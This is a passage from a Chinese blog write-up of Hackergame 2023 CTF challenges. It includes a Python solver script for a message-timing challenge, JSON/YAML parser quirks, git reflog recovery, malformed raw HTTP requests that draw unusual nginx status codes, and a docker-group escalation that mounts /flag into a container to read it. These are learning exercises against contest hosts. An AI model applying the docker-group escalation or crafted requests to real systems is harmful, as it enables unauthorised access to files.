    <span class="token comment"># 'Accept-Encoding': 'gzip, deflate',</span>
    <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://202.38.93.111:10021'</span><span class="token punctuation">,</span>
    <span class="token string">'DNT'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
    <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
    <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://202.38.93.111:10021/'</span><span class="token punctuation">,</span>
    <span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'1.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string">'Pragma'</span><span class="token punctuation">:</span> <span class="token string">'no-cache'</span><span class="token punctuation">,</span>
    <span class="token string">'Cache-Control'</span><span class="token punctuation">:</span> <span class="token string">'no-cache'</span>
<span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">deleteMsg</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        <span class="token string">'http://202.38.93.111:10021/api/deleteMessage'</span><span class="token punctuation">,</span>
        cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>
        headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
        json<span class="token operator">=</span>json_data<span class="token punctuation">,</span>
        verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>


response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    <span class="token string">'http://202.38.93.111:10021/api/getMessages'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
msgs <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'messages'</span><span class="token punctuation">]</span>

flag <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"hack\[[a-z]+\]"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>M<span class="token punctuation">)</span>


time_begin <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> k<span class="token punctuation">,</span> msg <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>msgs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">]</span>
    delay <span class="token operator">=</span> msg<span class="token punctuation">[</span><span class="token string">'delay'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> text<span class="token punctuation">)</span>
        time_gone <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> time_begin
        time_delay <span class="token operator">=</span> delay <span class="token operator">-</span> time_gone
        <span class="token keyword">if</span> time_delay <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>time_delay<span class="token punctuation">)</span>
        deleteMsg<span class="token punctuation">(</span>k<span class="token punctuation">)</span>

response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    <span class="token string">'http://202.38.93.111:10021/api/getflag'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029025958809.png"></p>
<h2 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h2><blockquote>
<p>「生而为人，应该能够换尿布、策划入侵、杀猪、开船、造房子、写十四行诗、算账、建墙、正骨、抚慰临终之人、接受命令、下达命令、合作、独行、解决方程式、分析新问题、清理马粪、编程、烹饪美食、高效战斗、英勇牺牲。专业分工是给昆虫准备的。」—罗伯特·海莱恩（Robert Heinlein）</p>
<p>你觉得还是当昆虫轻松一些。</p>
<p>这时，你看到一只昆虫落在你面前，发出奇怪的叫声。你把这段声音录制了下来：这听起来像是一种<strong>通过无线信道传输图片的方式</strong>，如果精通此道，或许就可以接收来自国际空间站（ISS）的图片了。</p>
</blockquote>
<p>经典 SSTV</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029030447820.png"></p>
<p><code>flag{SSssTV_y0u_W4NNa_HaV3_4_trY}</code></p>
<h2 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h2><blockquote>
<p>你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。</p>
<p>这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」</p>
<p>小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」</p>
<p>小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W  研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</p>
<p>小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」</p>
<p><strong><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/c72aa1cc-1878-5eaa-9993-964b836d4217/yaml_vs_json.py">下载题目源代码</a></strong></p>
<p>你可以通过 <code>nc 202.38.93.111 10096</code> 来连接，或者点击下面的「打开/下载题目」按钮通过网页终端与远程交互。</p>
</blockquote>
<h3 id="JSON-⊄-YAML-1-1"><a href="#JSON-⊄-YAML-1-1" class="headerlink" title="JSON ⊄ YAML 1.1"></a>JSON ⊄ YAML 1.1</h3><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files">What valid JSON files are not valid YAML 1.1 files?</a></p>
<pre class="line-numbers language-none"><code class="language-none">12345e999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029032308243.png"></p>
<p>或者 </p>
<pre class="line-numbers language-none"><code class="language-none">{"a": 1e2}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>YAML 当成是字符串了</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029033655646.png"></p>
<h3 id="JSON-⊄-YAML-1-2"><a href="#JSON-⊄-YAML-1-2" class="headerlink" title="JSON ⊄ YAML 1.2"></a>JSON ⊄ YAML 1.2</h3><p>还是上面那个链接里有一句 </p>
<blockquote>
<p>YAML 1.2 is (with one <a target="_blank" rel="noopener" href="http://yaml.org/spec/1.2/spec.html#id2759572">minor caveat</a> regarding duplicate keys) a superset of JSON, so any valid JSON file is also a valid YAML file.</p>
</blockquote>
<p>也就是</p>
<blockquote>
<p>JSON’s <a target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc4627.txt">RFC4627</a>        requires that <a target="_blank" rel="noopener" href="http://yaml.org/spec/1.2-old/spec.html#mapping//">mappings</a> <a target="_blank" rel="noopener" href="http://yaml.org/spec/1.2-old/spec.html#key//">keys</a> merely “SHOULD” be <a target="_blank" rel="noopener" href="http://yaml.org/spec/1.2-old/spec.html#equality//">unique</a>, while YAML insists they        “MUST” be. Technically, YAML therefore complies with the        JSON spec, choosing to treat duplicates as an error. In practice, since        JSON is silent on the semantics of such duplicates, the only portable        JSON files are those with unique keys, which are therefore valid YAML        files.      </p>
</blockquote>
<p>那我构造两个相同 key 的试试呗</p>
<pre class="line-numbers language-none"><code class="language-none">{"a":123451243, "a":"afgafds"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030162730263.png"></p>
<p>JSON 和 YAML 1.1 只会取最后一个值，而 YAML 1.2 因为重复的 key 而报错了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># ...</span>
  File <span class="token string">"D:\Programs\Anaconda\lib\site-packages\ruamel\yaml\constructor.py"</span><span class="token punctuation">,</span> line <span class="token number">276</span><span class="token punctuation">,</span> <span class="token keyword">in</span> check_mapping_key
    <span class="token keyword">raise</span> DuplicateKeyError<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
ruamel<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>DuplicateKeyError<span class="token punctuation">:</span> <span class="token keyword">while</span> constructing a mapping
  <span class="token keyword">in</span> <span class="token string">"&lt;unicode string&gt;"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> column <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">123451243</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">:</span><span class="token string">"afgafds"</span><span class="token punctuation">}</span>
    <span class="token operator">^</span> <span class="token punctuation">(</span>line<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">)</span>
found duplicate key <span class="token string">"a"</span> <span class="token keyword">with</span> value <span class="token string">"afgafds"</span> <span class="token punctuation">(</span>original value<span class="token punctuation">:</span> <span class="token string">"123451243"</span><span class="token punctuation">)</span>
  <span class="token keyword">in</span> <span class="token string">"&lt;unicode string&gt;"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> column <span class="token number">17</span><span class="token punctuation">:</span>
    <span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">123451243</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">:</span><span class="token string">"afgafds"</span><span class="token punctuation">}</span>
                    <span class="token operator">^</span> <span class="token punctuation">(</span>line<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030163300305.png"></p>
<p>BTW，题目中用的版本是 </p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">PyYAML</span><span class="token operator">==</span><span class="token number">6.0</span>.1 ruamel.yaml<span class="token operator">==</span><span class="token number">0.17</span>.40 ruamel.yaml.clib<span class="token operator">==</span><span class="token number">0.2</span>.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>而 ruamel.yaml 在 0.18 之后已经不让使用 safe_load 方法了，当前最新的 0.18.3 版本直接把相关的方法移除了。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030163642779.png"></p>
<h2 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h2><blockquote>
<blockquote>
<p>图片使用 AI 技术生成，与真实人物无关。</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/copy.jpg"></p>
<p>「幸亏我发现了……」马老师长吁了一口气。</p>
<p>「马老师，发生甚么事了？」马老师的一位英国研究生问。</p>
<p>「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」</p>
<p>「这样啊，那太好了。」研究生说。</p>
<p>马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟……</p>
</blockquote>
<p>直接 <code>git reflog</code> 看看干了啥，然后 <code>git diff</code> 拿到 flag</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028234644479.png"></p>
<p><code>flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t}</code></p>
<h2 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h2><blockquote>
<blockquote>
<p>「HTTP 请求一瞬间就得到了响应，但是，HTTP 响应的 status line、header 和 body 都是确实存在的。如果将一个一个 HTTP 状态码收集起来，也许就能变成……变成……变成……」</p>
<p>「flag？」</p>
<p>「就能变成 flag！」</p>
</blockquote>
<hr>
<p>本题中，你可以向一个 nginx 服务器（对应的容器为**默认配置下的 <code>nginx:1.25.2-bookworm</code>**）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：</p>
<ul>
<li>获取第一个 flag 需要收集 5 种状态码；</li>
<li>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；</li>
<li>获取第三个 flag 需要收集 12 种状态码。</li>
</ul>
<p>关于无状态码的判断逻辑如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">crlf <span class="token operator">=</span> buf<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\r\n"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> buf<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">b""</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> crlf <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No CRLF found"</span><span class="token punctuation">)</span>
        status_line <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span>crlf<span class="token punctuation">]</span>
        http_version<span class="token punctuation">,</span> status_code<span class="token punctuation">,</span> reason_phrase <span class="token operator">=</span> status_line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b" "</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
        status_code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        buf <span class="token operator">+=</span> <span class="token string">"（无状态码）"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        status_code <span class="token operator">=</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</blockquote>
<h3 id="5-种状态码"><a href="#5-种状态码" class="headerlink" title="5 种状态码"></a>5 种状态码</h3><p>正常访问存在的路径 -&gt; 200</p>
<p>请求一个不存在的文件 404</p>
<p>不允许方法 OPTIONS -&gt; 405 Not Allowed</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">OPTIONS</span> <span class="token request-target url">/robots.txt</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>随便构造个恶意格式的请求 -&gt; 400</p>
<p>构造一个超长 URI -&gt; 414</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029040942711.png" alt="414"></p>
<h3 id="12-种状态码"><a href="#12-种状态码" class="headerlink" title="12 种状态码"></a>12 种状态码</h3><p>继续试试其他的请求</p>
<p>分段请求 Range -&gt; 206 Partial Content</p>
<pre class="line-numbers language-none"><code class="language-none">GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=0-4\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>HTTP/2 -&gt; 505 HTTP Version Not Supported</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030172957720.png"></p>
<p>超过范围的 Range -&gt; 416 Requested Range Not Satisfiable</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Range</span><span class="token punctuation">:</span> <span class="token header-value">bytes=6599\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030181658292.png"></p>
<p>501 Not Implemented</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Transfer-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">chunked\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>304 Not Modified</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/50x.html</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive\r\n</span></span>
<span class="token header"><span class="token header-name keyword">If-Modified-Since</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>或者用 <code>If-None-Match: "64dbafc8-1f1"</code> 类似这样也行</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030183934032.png"></p>
<p>构造一个 <code>Content-Length</code> 大于 nginx 设定的最大值的 -&gt; 413 Request Entity Too Large</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">9999999999999999\r\n\r\n</span></span>

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadsfjkldsjfaklfjasdfklgj\r\n\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231101040901705.png"></p>
<p>Expect <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect#large_message_body">Large message body</a> -&gt; 100</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231101041918874.png"></p>
<p>但是这里如果用 PUT 会405，于是还是改用 GET 了，发现其实也是会校验 Expect 字段的</p>
<blockquote>
<p>  The server checks the headers and generates the response.  The server sends <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/100"><code>100</code></a> (Continue), which instructs the client to send the message body.</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">origin.example.com\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">video/h264\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">120987\r\n</span></span>
<span class="token header"><span class="token header-name keyword">Expect</span><span class="token punctuation">:</span> <span class="token header-value">100-continue\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7231#section-5.1.1">RFC 7231 Expect</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231101042802443.png"></p>
<p>但是 nginx 好像没有实现 417 (Expectation Failed)？</p>
<p><a target="_blank" rel="noopener" href="https://trac.nginx.org/nginx/ticket/2062">Nginx doesn’t support HTTP status code 417 (Expectation Failed)</a></p>
<p>==&gt; [100, 200, 206, 304, 400, 404, 405, 413, 414, 416, 501, 505]</p>
<p>啊，终于集齐了，要把 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">MDN HTTP 响应状态码</a> 文档给翻烂了（甚至 <del>差点</del> 已经开始翻阅 <a target="_blank" rel="noopener" href="https://trac.nginx.org/nginx/browser?order=name">nginx 源码</a> 了。。</p>
<p><code>flag{I think that when many such status codes are accumulated def0ee5cf2 it becomes a lifetime}</code></p>
<h3 id="没有状态……哈？"><a href="#没有状态……哈？" class="headerlink" title="没有状态……哈？"></a>没有状态……哈？</h3><p>对应的容器为<strong>默认配置下的 <code>nginx:1.25.2-bookworm</code></strong></p>
<p>配置为</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">user</span>  nginx</span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">worker_processes</span>  auto</span><span class="token punctuation">;</span>

<span class="token directive"><span class="token keyword">error_log</span>  /var/log/nginx/error.log notice</span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">pid</span>        /var/run/nginx.pid</span><span class="token punctuation">;</span>


<span class="token directive"><span class="token keyword">events</span></span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">worker_connections</span>  <span class="token number">1024</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">include</span>       /etc/nginx/mime.types</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">default_type</span>  application/octet-stream</span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">log_format</span>  main  <span class="token string">'<span class="token variable">$remote_addr</span> - <span class="token variable">$remote_user</span> [<span class="token variable">$time_local]</span> "<span class="token variable">$request</span>" '</span>
                      <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>" '</span>
                      <span class="token string">'"<span class="token variable">$http_user_agent</span>" "<span class="token variable">$http_x_forwarded_for</span>"'</span></span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">access_log</span>  /var/log/nginx/access.log  main</span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">sendfile</span>        <span class="token boolean">on</span></span><span class="token punctuation">;</span>
    <span class="token comment">#tcp_nopush     on;</span>

    <span class="token directive"><span class="token keyword">keepalive_timeout</span>  <span class="token number">65</span></span><span class="token punctuation">;</span>

    <span class="token comment">#gzip  on;</span>

    <span class="token directive"><span class="token keyword">include</span> /etc/nginx/conf.d/*.conf</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>gzip 是关闭的，看来不能拿来整活了。</p>
<p>随手试了一下，<strong>发送不完整或格式错误的请求</strong>，这样就能出了</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">GET /HTTP/1.1\r\n
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">yourserver.com\r\n\r\n</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030174919119.png"></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030174953331.png"></p>
<p><code>flag{great backward compatibility of nginx, R1ght?}</code></p>
<p>看起来是后向兼容的设计？没响应头部的数据只有 body 的了。</p>
<p>查了下，其实就是 <strong>HTTP/0.9</strong> 的规范了</p>
<p>那确实直接 <code>GET /1\r\n\r\n</code> 就行了，哈哈</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231030175122530.png"></p>
<p>See also: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP">MDN: HTTP 的发展</a></p>
<h2 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h2><blockquote>
<p>X 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！</p>
<p>但果真如此吗？</p>
<hr>
<p>提供的环境会自动登录低权限的 <code>hg</code> 用户。登录后的提示信息显示了如何在该环境中使用 docker。读取 <code>/flag</code>（注意其为软链接）获取 flag。</p>
<p>题目环境运行 15 分钟后会自动关闭。</p>
<p>你可以在下面列出的两种方法中任选其一来连接题目：</p>
<ul>
<li>点击下面的「打开/下载题目」按钮通过网页终端与远程交互。如果采用这种方法，在正常情况下，你不需要手动输入 token。</li>
<li>在 Linux、macOS、WSL 或 Git Bash 等本地终端中使用 <code>stty raw -echo; nc 202.38.93.111 10338; stty sane</code> 命令来连接题目。如果采用这种方法，你必须手动输入 token（复制粘贴也可）。<strong>注意，输入的 token 不会被显示，输入结束后按 Ctrl-J 即可开始题目。</strong></li>
</ul>
<p>无论采用哪种方法连接题目，启动题目均需要数秒时间，出现黑屏是正常现象，请耐心等待。</p>
</blockquote>
<p>经典日机器/提权/容器逃逸的方法了，哈哈</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alpine:~$ <span class="token function">docker</span> run -v /flag:/flag alpine:latest <span class="token function">cat</span> /flag
flag<span class="token punctuation">{</span>u5e_r00t1ess_conta1ner_8ed24f192c_plz<span class="token operator">!</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029044834528.png"></p>
<h2 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h2><blockquote>
<p>你的学长去留学了，这一走短时间内怕是回不来了。于是，你在今年暑假来了一场计划已久的旅行，并顺路探望了这位久别的学长。翻阅当天拍下的照片，种种回忆和感慨油然而生。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/travel-photo-3.jpg" alt="与学长一起品尝拉面"></p>
<p>请观察照片并结合所有文字内容，正确回答题目以获取 flag。</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:12345/">http://202.38.93.111:12345/</a></p>
</blockquote>
<blockquote>
<p><strong>🌻 上午</strong></p>
<p>与学长碰面后，他带你参观了他的学校。在校园的一个展厅内，你发现了一枚神秘的金色奖牌，它闪闪发光，令人心生羡慕。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/01.JPG" alt="金色奖牌"></p>
<p><strong>🌻 中午</strong></p>
